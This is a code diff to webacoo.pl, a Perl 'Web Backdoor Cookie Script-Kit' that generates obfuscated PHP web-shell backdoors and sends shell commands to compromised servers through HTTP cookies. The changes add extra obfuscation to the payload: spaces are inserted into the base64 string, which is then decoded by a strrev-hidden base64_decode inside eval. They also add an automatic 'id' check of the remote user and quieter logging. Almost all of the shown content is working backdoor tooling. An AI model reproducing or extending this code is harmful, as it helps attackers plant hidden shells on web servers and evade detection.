@@ -15,7 +15,7 @@ my @phpsf = ("system", "shell_exec", "exec", "passthru", "popen");
 
 # Setup
 $WEBACOO{name} = "webacoo.pl";
-$WEBACOO{version} = '0.1.3';
+$WEBACOO{version} = '0.1.4';
 $WEBACOO{description} = 'Web Backdoor Cookie Script-Kit';
 $WEBACOO{author} = 'Anestis Bechtsoudis';
 $WEBACOO{email} = 'anestis@bechtsoudis.com';
@@ -125,6 +125,12 @@ if(defined $args{t}) {
         }
     }
 
+    # Initial check & print user info
+    $command="id";
+    print "[+] Connected to remote server as:\n";
+    cmd_request();
+    print "\n";
+
     # Print quit help message
     print "Type 'exit' to quit terminal!\n\n";
 
@@ -135,7 +141,7 @@ if(defined $args{t}) {
 
 	# Exit if "exit" is typed
     	if($command eq "exit") { print "\n^Bye^\n"; last; }
-    	cmd_request();
+    	cmd_request("1");
     }
 }
 
@@ -236,8 +242,10 @@ sub generate_backdoor
     # otherwise encode payload & append the tags
     if(!defined $args{r}) {
         $payload = encode_base64($payload, '');
-	$prefix .= '$b=strrev("edoced_4"."6esab");eval($b("';
-	$suffix = "\"));".$suffix
+        # insert space after each character
+	$payload =~ s/(\S{1})/$1 /g;
+	$prefix .= '$b=strrev("edoced_4"."6esab");eval($b(str_replace(" ","","';
+	$suffix = "\")));".$suffix;
     }
 
     # Create backdoor file
@@ -251,6 +259,10 @@ sub generate_backdoor
 # Backdoor: send request & get response
 sub cmd_request
 {
+    # Silent flag
+    my $silent = @_;
+
+    # Port assign
     my $dst_host = $WEBACOO{rhost};
     my $dst_port = $WEBACOO{rport};
 
@@ -277,14 +289,14 @@ sub cmd_request
     $request .= "\r\n";
 
     # Print request if verbose level > 0
-    print "*** Request HTTP Header ***\n$request" if($WEBACOO{vlevel} > 0);
+    print "*** Request HTTP Header ***\n$request" if($WEBACOO{vlevel} > 0 && $silent);
 
     # Establish connection
-    my $sock=IO::Socket::INET->new(
-                                   PeerAddr=> $dst_host,
-                                   PeerPort => $dst_port,
-                                   Proto => "tcp",
-                                  );
+    $sock=IO::Socket::INET->new(
+                                PeerAddr=> $dst_host,
+                                PeerPort => $dst_port,
+                                Proto => "tcp",
+                               );
     # Error checking
     die "Could not create socket: $!\n" unless $sock;
 
@@ -302,9 +314,9 @@ sub cmd_request
     @verdata = split (/^\r\n/m,$output);
     $verdata[1] = "" if (@verdata == 1); # If data field is empty
     chomp($verdata[0]);
-    print "*** Response HTTP Header ***\n$verdata[0]\n\n" if($WEBACOO{vlevel} > 0);
-    print "*** Response HTTP Data ***\n$verdata[1]\n\n" if($WEBACOO{vlevel} > 1);
-    print "*** Command Output ***\n" if($WEBACOO{vlevel} > 0);
+    print "*** Response HTTP Header ***\n$verdata[0]\n\n" if($WEBACOO{vlevel} > 0 && $silent);
+    print "*** Response HTTP Data ***\n$verdata[1]\n\n" if($WEBACOO{vlevel} > 1 && $silent);
+    print "*** Command Output ***\n" if($WEBACOO{vlevel} > 0 && $silent);
 
     # Unescape URI escaped special characters
     $output =~ s/%([0-9A-Fa-f]{2})/chr(hex($1))/eg;
@@ -322,8 +334,13 @@ sub cmd_request
     my $end = index($output,$WEBACOO{delim},$start);
     $output = substr($output,$start,$end-$start);
 
+    # Check for disabled PHP system functions
+    if(!$output && $command eq "id") { 
+	print "\n[-] Response cookie has no data.\n"; 
+        print "[!] Backdoor PHP system function possibly disabled.\n";
+    }
     # Decode response and print output
-    print decode_base64($output);
+    else { print decode_base64($output); }
 
     # Flush content
     @verdata = ();
